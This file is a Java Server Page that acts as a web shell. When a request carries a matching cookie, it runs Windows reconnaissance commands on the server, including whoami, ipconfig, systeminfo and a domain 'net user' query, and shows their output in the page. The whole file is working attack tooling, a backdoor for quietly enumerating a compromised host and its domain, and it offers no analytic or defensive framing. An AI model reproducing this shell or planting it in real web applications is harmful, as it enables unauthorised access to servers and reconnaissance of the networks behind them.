<%@ page import="java.io.*" %>
<%
    String cookieValue = "your_cookie_value"; // replace with your cookie value
    String inputCookieValue = request.getCookies()[0].getValue(); // assuming the cookie you want is the first one

    if (cookieValue.equals(inputCookieValue)) {
        out.println("<style>body { font-family: Arial, sans-serif; } .command { color: #008000; } .output { color: #0000FF; }</style>");
        String[] commands = {"whoami", "ipconfig", "systeminfo", "whoami /upn", "net user %username% /domain"};
        for (String command : commands) {
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            out.println("<p class='command'>" + command + "</p>");
            while ((line = in.readLine()) != null) {
                out.println("<p class='output'>" + line + "</p>");
            }
        }
    } else {
        out.println("Access denied.");
    }
%>
